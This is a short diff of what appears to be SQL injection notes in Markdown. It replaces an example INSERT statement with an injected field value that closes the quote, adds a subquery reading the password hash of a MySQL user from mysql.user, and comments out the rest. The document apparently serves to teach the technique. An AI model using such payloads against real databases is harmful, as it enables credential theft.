@@ -193,7 +193,8 @@
 ```sql
 select password from mysql.user where user='alanr' limit 0,1
 
-INSERT INTO authors(AuthorID, FirstName, LastName, YearBorn)VALUES ('123456','Bob,',(select password from mysql.user where user='alanr' limit 0,1),'1990')
+Tommy',(select password from mysql.user where user='alanr' limit 0,1),'1990')-- -','1818')
+
 
 ```
 
